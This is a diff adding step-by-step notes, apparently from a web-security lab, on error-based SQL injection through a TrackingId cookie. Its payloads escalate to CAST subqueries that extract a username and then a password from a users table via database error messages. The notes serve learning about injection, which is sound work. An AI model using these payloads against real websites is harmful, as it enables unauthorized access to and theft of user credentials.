@@ -1,0 +1,34 @@
+append a single quote to the tracking id
+that will cause a verbose error message which discloses the full SQL query including the value of the cookie
+
+TrackingId=ogAZZfxtOKUELbuJ'
+
+add comment characters to comment out the rest of the query which includes the extra quote chr causing the error,you will no longer receive an error
+
+TrackingId=ogAZZfxtOKUELbuJ'--
+
+modify the query to include a SELECT subquery and cast the returned value to an int type
+
+TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
+
+you get an error saying AND should be a boolean
+
+TrackingId=ogAZZfxtOKUELbuJ' AND 1 =CAST((SELECT 1) AS int)--
+
+the error dissapears
+
+TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
+
+you get an error suggesting there is a character limit,delete the tracking id to fix this
+
+TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
+
+modify to retuen only one row
+
+TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+
+this should return the first username from the table
+
+now get the password
+
+TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
